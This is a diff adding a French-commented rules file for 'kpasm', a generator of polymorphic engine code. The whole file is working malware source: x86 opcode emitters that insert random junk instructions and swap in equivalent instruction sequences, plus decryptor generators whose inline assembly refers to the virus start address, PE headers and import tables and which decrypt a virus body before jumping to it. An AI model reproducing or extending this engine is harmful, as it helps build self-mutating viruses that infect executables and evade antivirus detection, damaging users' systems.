@@ -1,0 +1,923 @@
+   //KPASM rules used by kpasm to build poly engine source code
+
+
+   //=============================== OPCODES GENERIQUES ==========================
+
+   //xxx
+   junk() {
+   3: {
+       mov_reg_cst(freereg1,freemem0-(rndint0>>20));
+       junk();
+       mov_reg_regi_dep(freereg0,freereg1,rndint0>>20);
+   }
+   4: {
+       if([freemem0]!=rndint0) {
+           cmp_mem_cst(freemem0,rndint0);
+           saut_z(rndint0>>14+$([ebp+imagebase]));
+         }
+       }
+   2: {
+        lock(freemem0);
+        junk_reg(freereg0);
+        mov_mem_reg(freemem0,freereg0);
+       }
+   4: {
+       junk_reg(freereg0);
+       }
+   1: {
+       push_reg(rndreg0);
+       junk_reg(rndreg0);
+       pop_reg(rndreg0);
+       }
+   2: {
+       junk();
+       junk();
+       }
+   6: DEFAUT {
+       raw(1) asm {
+       }
+    }
+   }
+
+
+   //mov regx,xxx
+   mov_reg_cst(reg:registre,cst:entier)
+   {
+   1: {
+       mov_reg_cst(reg,cst-[freemem0]);
+       junk();
+       add_reg_mem(reg,freemem0);
+       }
+   1: {
+       mov_reg_cst(reg,cst+[freemem0]);
+       junk();
+       sub_reg_mem(reg,freemem0);
+       }
+   1: {
+       mov_reg_mem(reg,freemem0);
+       junk();
+       add_reg_cst(reg,cst-[freemem0]);
+       }
+   1: {
+       mov_reg_mem(reg,freemem0);
+       junk();
+       sub_reg_cst(reg,[freemem0]-cst);
+       }
+   1: {
+       mov_reg_cst(reg,cst-1);
+       junk();
+       inc_reg(reg);
+       }
+   4: DEFAUT
+     {
+       write8(0xB8|reg);
+       write32(cst);
+     }
+   }
+
+
+   //xxx regx
+   junk_reg(reg:registre)
+   {
+   1: {
+       test_reg_cst(reg,rndint0);
+   }
+   1: {
+       inc_reg(reg);
+   }
+   1: {
+       mov_reg_cst(reg,rndint0);
+       }
+   1:  {
+       add_reg_cst(reg,rndint0);
+       }
+   1:  {
+       sub_reg_cst(reg,rndint0);
+       }
+   1:  {
+       add_reg_mem(reg,freemem0);
+       }
+   1:  {
+       sub_reg_mem(reg,freemem0);
+       }
+   1:  {
+       mov_reg_mem(reg,freemem0);
+       }
+   1: {
+       junk_reg(reg);
+       junk_reg(reg);
+       }
+   0:DEFAUT {
+       raw (1) asm {
+           }
+       }
+   }
+
+   //jmp xxx
+   jmp_cst(location:adresse)
+   {
+   0: DEFAUT {
+       label0;
+       write8(0xE9);
+       write32(location-label0-5); //5=taille de l'opcode jmp xxxxxxxxx
+    }
+   }
+
+   //jmp regx
+   jmp_reg(reg:registre)
+   {
+   0: DEFAUT {
+       write16(0xE0FF | reg<<8);
+    }
+   }
+
+   //call [xxx]
+   call_mem(mem:adresse)
+   {
+       write16(0x15FF);
+       write32(mem);
+   }
+
+   //push xxx
+   push_cst(cst:entier)
+   {
+   1: {
+       mov_reg_cst(freereg0,cst);
+       junk();
+       push_reg(freereg0);
+      }
+   1: {
+       lock(freemem0);
+       mov_mem_cst(freemem0,cst);
+       junk();
+       push_mem(freemem0);
+      }
+   1: {
+       junk();
+       push_cst(cst);
+   }
+   4: DEFAUT
+     {
+       write8(0x68);
+       write32(cst);
+     }
+   }
+
+   //push regx
+   push_reg(reg:registre)
+   {
+   3: {
+       lock(freemem0);
+       mov_mem_reg(freemem0,reg);
+       junk();
+       push_mem(freemem0);
+       }
+   4: DEFAUT
+     {
+       write8(0x50 | reg);
+     }
+   }
+
+   //pop regx
+   pop_reg(reg:registre)
+   {
+   1: DEFAUT
+     {
+       write8(0x58|reg);
+     }
+   }
+
+   //push [xxx]
+   push_mem(mem:adresse)
+   {
+   1: {
+       mov_reg_mem(freereg0,mem);
+       junk();
+       push_reg(freereg0);
+   }
+   4: DEFAUT {
+       write16(0x35FF);
+       write32(mem);
+     }
+   }
+
+   //test [xxx],yyy
+   test_mem_cst(mem:adresse,cst:entier)
+   {
+   0: DEFAUT {
+       write16(0x05F7);
+       write32(mem);
+       write32(cst);
+     }
+   }
+
+   //test regx,xxx
+   test_reg_cst(reg:registre,cst:entier)
+   {
+   0: DEFAUT {
+       if(reg==EAX) {
+           write8(0xA9);
+       }
+       else {
+           write16(0xC0F7 | reg << 8);
+       }
+       write32(cst);
+     }
+   }
+
+   //cmp regx,xxx
+   cmp_reg_cst(reg:registre,cst:entier)
+   {
+   1: DEFAUT {
+       if(reg==EAX) {
+           write8(0x3D);
+       }
+       else {
+           write16(0xF881 | reg << 8);
+       }
+       write32(cst);
+     }
+   }
+
+   //cmp [xxx],yyy
+   cmp_mem_cst(mem:adresse,cst:entier)
+   {
+   1: {
+       mov_reg_mem(freereg0,mem);
+       cmp_reg_cst(freereg0,cst);
+       }
+   4: DEFAUT {
+       write16(0x3D81);
+       write32(mem);
+       write32(cst);
+     }
+   }
+
+   //ret
+   retour()
+   {
+   3:{
+       junk();
+       retour();
+   }
+   1:{
+       pop_reg(freereg0);
+       junk();
+       jmp_reg(freereg0);
+   }
+   4: DEFAUT {
+       write8(0xC3);
+     }
+   }
+
+   //inc regx
+   inc_reg(reg:registre)
+   {
+     write8(0x40 | reg);
+   }
+
+
+
+   //mov regx,[regy]
+   mov_reg_regi(regdst:registre,regsrc:registre)
+   {
+
+   6: DEFAUT
+    {
+       if(regsrc!=EBP)
+       {
+          write16(0x008B | regsrc<<8 | regdst<<11);
+        }
+       else
+       {
+          write8(0x8B);
+          write8(0x45 | regdst<<3);
+          write8(0x00);
+       }
+    }
+   }
+
+
+   //mov regx,[regy+deplacement]
+   mov_reg_regi_dep(regdst:registre,regsrc:registre,deplacement:entier)
+   {
+
+   1: {
+       mov_reg_reg(freereg0,regsrc);
+       junk();
+       add_reg_cst(freereg0,deplacement);
+       junk();
+       mov_reg_regi(regdst,freereg0);
+   }
+
+   4: DEFAUT
+    {
+       if(deplacement<256 && deplacement>0) { //deplacement sur 8bits
+         if(regsrc!=ESP) {
+            write16(0x408B | regsrc<<8 | regdst<<11);
+          }
+         else {
+
+           write16(0x448B | regdst<<11 );
+           write8(0x24);
+         }
+         write8(deplacement);
+       }
+       else { //deplacement sur 32bits
+         if(regsrc!=ESP) {
+            write16(0x808B | regsrc<<8 | regdst<<11);
+          }
+         else {
+           write16(0x848B | regdst<<11  );
+           write8(0x24);
+         }
+         write32(deplacement);
+       }
+    }
+   }
+
+
+   //mov [regx+deplacement],regy
+   mov_regi_reg_dep(regdst:registre,regsrc:registre,deplacement:entier)
+   {
+
+   1: {
+       mov_reg_reg(freereg0,regsrc);
+       junk();
+       add_reg_cst(freereg0,deplacement);
+       junk();
+       mov_reg_regi(regdst,freereg0);
+   }
+
+   4: DEFAUT
+    {
+       if(deplacement<256 && deplacement>0) { //deplacement sur 8bits
+         if(regdst!=ESP) {
+            write16(0x4089 | regdst<<8 | regsrc<<11);
+          }
+         else {
+
+           write16(0x4489 | regsrc<<11 );
+           write8(0x24);
+         }
+         write8(deplacement);
+       }
+       else { //deplacement sur 32bits
+         if(regdst!=ESP) {
+            write16(0x8089 | regdst<<8 | regsrc<<11);
+          }
+         else {
+           write16(0x8489 | regsrc<<11  );
+           write8(0x24);
+         }
+         write32(deplacement);
+       }
+    }
+   }
+
+   //mov [xxx],yyy
+   mov_mem_cst(adr:adresse,constante:entier)
+   {
+   2:
+   {
+        mov_reg_cst(freereg0,constante);
+        junk();
+        mov_mem_reg(adr,freereg0);
+   }
+   10:DEFAUT
+    {
+       write16(0x05C7);
+       write32(adr);
+       write32(constante);
+    }
+   }
+
+   //mov [regx],regy
+   mov_regi_reg(regdst:registre,regsrc:registre)
+   {
+
+   3: DEFAUT
+    {
+       if(regdst!=EBP)
+       {
+          write16(0x0089 | regdst<<8 | regsrc<<11);
+       }
+       else
+       {
+          write8(0x89);
+          write8(0x45 | regsrc<<3);
+          write8(0x00);
+       }
+    }
+   }
+
+   //sub regx, regy
+   sub_reg_reg(regdest:registre,regsrc:registre)
+   {
+   1: DEFAUT
+     {
+       write16(0xC02B | regdest << 11 | regsrc << 8);
+     }
+   }
+
+   //sub regx,[xxx]
+   sub_reg_mem(reg:registre,adr:adresse)
+   {
+   3:
+    {
+       mov_reg_mem(freereg0,adr);
+       junk();
+       sub_reg_reg(reg,freereg0);
+     }
+   3: DEFAUT
+     {
+       write16(0x052B | reg<<11);
+       write32(adr);
+     }
+   }
+
+   //sub regx,xxx
+   sub_reg_cst(reg:registre,cst:entier)
+   {
+   2:
+     {
+       mov_reg_cst(freereg0,cst);
+       junk();
+       sub_reg_reg(reg,freereg0);
+     }
+   1:
+      {
+        push_reg(rndreg0);
+        mov_reg_cst(rndreg0,cst);
+        junk();
+        sub_reg_reg(reg,rndreg0);
+        pop_reg(rndreg0);
+      }
+   2: DEFAUT
+     {
+       if(reg==EAX)
+       {
+         write8(0x2D);
+       }
+       else
+       {
+         write16(0xE881 | reg<<8);
+       }
+       write32(cst);
+     }
+   }
+
+   //add regx,regy
+   add_reg_reg(regdest:registre,regsrc:registre)
+   {
+   1: DEFAUT
+     {
+       write16(0xC003 | regdest<<11 | regsrc<<8);
+     }
+   }
+
+   //add regx,[xxx]
+   add_reg_mem(reg:registre,adr:adresse)
+   {
+   3:
+     {
+       mov_reg_mem(freereg0,adr);
+       junk();
+       add_reg_reg(reg,freereg0);
+     }
+   12: DEFAUT
+     {
+       write16(0x0503 | (reg << 11));
+       write32(adr);
+     }
+   }
+
+   //add regx,xxx
+   add_reg_cst(reg:registre,cst:entier)
+   {
+   2:
+     {
+       mov_reg_cst(freereg0,cst);
+       junk();
+       add_reg_reg(reg,freereg0);
+     }
+   1:
+      {
+        push_reg(rndreg0);
+        mov_reg_cst(rndreg0,cst);
+        junk();
+        add_reg_reg(reg,rndreg0);
+        pop_reg(rndreg0);
+      }
+   4: DEFAUT  {
+       if(reg==EAX) {
+         write8(0x05);
+       }
+       else {
+         write16(0xC081 | (reg << 8));
+       }
+       write32(cst);
+     }
+   }
+
+   //mov regx,[xxx]
+   mov_reg_mem(reg:registre,adr:adresse)
+   {
+   1: {
+     mov_reg_cst(freereg0,adr);
+     junk();
+     mov_reg_regi(reg,freereg0);
+   }
+   2: {
+     mov_reg_cst(freereg0,adr-(rndint0%0x8000));
+     junk();
+     mov_reg_regi_dep(reg,freereg0,(rndint0%0x8000));
+     }
+
+   6: {
+     mov_reg_cst(freereg0,adr-(rndint0%128));
+     junk();
+     mov_reg_regi_dep(reg,freereg0,(rndint0%128));
+     }
+
+   4: DEFAUT  {
+     if(reg==EAX)   {
+       write8(0xA1);
+     }
+     else  {
+       write16(0x058B | reg <<11);
+     }
+     write32(adr);
+    }
+   }
+
+   //mov [xxx],regx
+   mov_mem_reg(mem:adresse,reg:registre)
+   {
+   1: {
+     mov_reg_cst(freereg0,mem);
+     junk();
+     mov_regi_reg(freereg0,reg);
+   }
+
+   2: {
+     mov_reg_cst(freereg0,mem-(rndint0%0x8000));
+     junk();
+     mov_regi_reg_dep(freereg0,reg,(rndint0%0x8000));
+     }
+
+   5: {
+     mov_reg_cst(freereg0,mem-(rndint0%128));
+     junk();
+     mov_regi_reg_dep(freereg0,reg,(rndint0%128));
+     }
+
+   4:DEFAUT  {
+      if(reg==EAX)
+      {
+        write8(0xA3);
+        write32(mem);
+      }
+      else   {
+         write16(0x0589 | reg << 11);
+         write32(mem);
+      }
+    }
+   }
+
+   //cmp regx,0
+   cmp_reg_zero(reg:registre)
+   {
+   1:   {
+       raz_registre(freereg0);
+       cmp_reg_reg(freereg0,reg);
+     }
+   1:  {
+       raz_registre(freereg0);
+       cmp_reg_reg(reg,freereg0);
+     }
+   3: DEFAUT  {
+     if(reg!=EBP)   {
+       write16(0xF883 | reg << 8);
+       write8(0);
+      }
+      else    {
+        write16(0xFD83);
+        write8(0);
+      }
+    }
+   }
+
+   //jnz xxx
+   saut_nz(location:adresse)
+   {
+
+   1: DEFAUT
+    {
+      label0;
+      /* Peut-on faire directement un jnz short ? */
+      if(((location-label0-2) < 127) && (location-label0-2 > 0-128))
+      {
+        write8(0x75);
+        write8(location-label0-2);
+      }
+      /* sinon on fait un jnz dword */
+      else
+      {
+        write16(0x850F);
+        write32(location-label0-(6));
+      }
+    }
+   }
+
+   //jz xxx
+   saut_z(location:adresse)
+   {
+   1: DEFAUT
+    {
+      label0;
+      /* Peut-on faire directement un jz short ? */
+      if(((location-label0-2) < 127) && (location-label0-2 > 0-128))
+      {
+        write8(0x74);
+        write8(location-label0-2);
+      }
+      /* sinon on fait un jz dword */
+      else
+      {
+        write16(0x840F);
+        write32(location-label0-(6));
+      }
+    }
+   }
+
+   //xor regx,regx
+   raz_registre(reg:registre)
+   {
+   1: {
+       junk();
+       mov_reg_cst(reg,0);
+     }
+   1: {
+       junk();
+       raz_registre(freereg0);
+       mov_reg_reg(reg,freereg0);
+     }
+   2: {
+      write16(0xC033 | reg << 11 | reg << 8) ;   # xor reg,reg
+     }
+
+   1: DEFAUT   {
+       write16(0xC02B | reg << 11 | reg << 8);   # sub reg,reg
+     }
+   }
+
+   //cmp regx,regy
+   cmp_reg_reg(reg1:registre,reg2:registre)
+   {
+    1: DEFAUT {
+      write16(0xC03B | reg1 <<11 | reg2 <<8);
+    }
+   }
+
+   //mov regx,regy
+   mov_reg_reg(regdest:registre,regsrc:registre)
+   {
+   1: DEFAUT {
+      write16(0xC08B | regsrc <<8 | regdest<<11);
+    }
+   }
+
+   //======================== DECRYPTEUR CRYPTOAPIS =========================
+   // Initialisation de la mémoire
+   cryptoapis_init()
+   {
+   1: {
+       lock(0,location_ptr);
+       lock(0,tmp1);
+       lock(0,tmp2);
+       lock(freemem0,csp);
+       lock(freemem1,hash);
+       lock(freemem2,key);
+       lock(freemem3,taille_code);
+       lock(freemem4,offset_code);
+       lock(freemem5,position_cle);
+
+       //Initialisation mémoire
+       raw(0) asm
+       {
+           and [ebp+nb_fake_pushs],dword ptr 0
+           lea eax,[ebp+locations+8]
+           mov location_ptr,eax
+           mov ebx,[ebp+virus_start_va]
+           add ebx,TAILLE_IMPORTS + DECRYPTOR_SIZE
+           mov tmp1,ebx
+           mov eax,[ebp+poly_ca_peheader]
+           mov eax,[eax+80h]
+           add eax,[ebp+imagebase]
+           mov tmp2,eax
+       }
+       mem_init(offset_code,tmp1);
+       mem_init(position_cle,tmp2);
+       mem_init(taille_code,$(code_to_crypt_len));
+   }
+   0: DEFAUT {
+       //Juste pour enlever les warnings à la con
+     }
+   }
+
+   push_cst_csp()
+   {
+       push_cst(csp);
+   }
+
+   push_cst_hash()
+   {
+       push_cst(hash);
+   }
+
+   push_mem_csp()
+   {
+       push_mem(csp);
+   }
+
+   push_mem_hash()
+   {
+       push_mem(hash);
+   }
+
+   push_mem_position_cle()
+   {
+       push_mem(position_cle);
+   }
+
+   push_cst_key()
+   {
+       push_cst(key);
+   }
+
+   push_mem_offset_code()
+   {
+       push_mem(offset_code);
+   }
+
+   push_cst_taille_code()
+   {
+       push_cst(taille_code);
+   }
+
+   push_mem_key()
+   {
+       push_mem(key);
+   }
+
+   //======================== DECRYPTEUR SIMPLE =========================
+
+   simple_init()
+   {
+   1: {
+       lock(freemem0,offset_code);
+       lock(0,location_ptr);
+       lock(0,offset_code);
+       raw(0) asm {
+           and [ebp+nb_fake_pushs],dword ptr 0
+           lea eax,[ebp+locations+8]
+           mov location_ptr,eax
+           mov ebx,[ebp+virus_start_va]
+           add ebx,TAILLE_IMPORTS + DECRYPTOR_SIZE
+           mov offset_code,ebx
+       }
+      }
+   0: DEFAUT {}
+   }
+
+
+   simple_init_registres()
+   {
+   1: {
+       lock(0,forme);
+       lock(freereg0,pointeur); //registre qui servira de pointeur
+       lock(freereg1,boucle);   //registre qui servira de compteur de boucle
+       lock(freereg2,travail);  //registre pour els opérations intermédiaires
+       mov_reg_cst(pointeur,offset_code);
+       mov_reg_cst(boucle,($(code_to_crypt_len)>>2)+1); //decryption par dword
+       label0;
+       lock(label0,retour_boucle);
+      }
+
+   0: DEFAUT {}
+   }
+
+   simple_lit()
+   {
+   1: {
+       mov_reg_regi(travail,pointeur);
+      }
+
+   0: DEFAUT {}
+   }
+
+   simple_decrypte()
+   {
+   1: {
+       sub_reg_cst(travail,$([ebp+simple_cle]));
+      }
+
+   0: DEFAUT {}
+   }
+
+   simple_ecrit()
+   {
+   1: {
+       mov_regi_reg(pointeur,travail);
+       add_reg_cst(pointeur,4);
+      }
+
+   0: DEFAUT {}
+   }
+
+   simple_boucle()
+   {
+   1: {
+       sub_reg_cst(boucle,1);
+       cmp_reg_zero(boucle);
+       saut_nz(retour_boucle);
+      }
+   0: DEFAUT {}
+   }
+
+   simple_saut()
+   {
+   1: {
+       jmp_cst(offset_code);
+      }
+   1: {
+       push_cst(offset_code);
+       junk();
+       retour();
+   }
+   0: DEFAUT {}
+   }
+
+
+   //================================== COMMUN ==============================
+   call_api(num_api:entier)
+   {
+       lock(0,adresse_api);
+       raw(4) ASM {
+           mov eax,num_api
+           lea eax,[ebp+index_iat+eax*4]
+           mov eax,[eax]
+           shl eax,2
+           add eax,[ebp+a32_ft]
+           add eax,[ebp+imagebase]          ;rva->va
+           mov adresse_api,eax
+       }
+       call_mem(adresse_api);
+   }
+
+   random_pushs_api()
+   {
+
+   /* 1: {
+       random_pushs_api();
+       raw(0) asm {
+       cmp [ebp+poly_passe],byte ptr NB_PASSES
+       jnz rpa_passe
+       mov eax,[ebp+nb_fake_pushs]
+       inc dword ptr [ebp+nb_fake_pushs]
+   rpa_passe:
+         }
+       random_push();
+       }
+   */
+   1: DEFAUT {
+    }
+   }
+
+   random_push()
+   {
+   2: {
+       push_mem(freemem0);
+      }
+
+   3: DEFAUT {
+       push_cst(rndint0);
+      }
+   }
+
+   push_next_location()
+   {
+       lock(0,next_location);
+       RAW(0) ASM {
+           mov eax,location_ptr
+           mov eax,[eax]
+           add eax,[ebp+imagebase]
+           mov next_location,eax
+           cmp [ebp+poly_passe],byte ptr NB_PASSES
+           jnz pnl_autres_passes
+           add location_ptr,8
+   pnl_autres_passes:
+       }
+       push_cst(next_location);
+   }
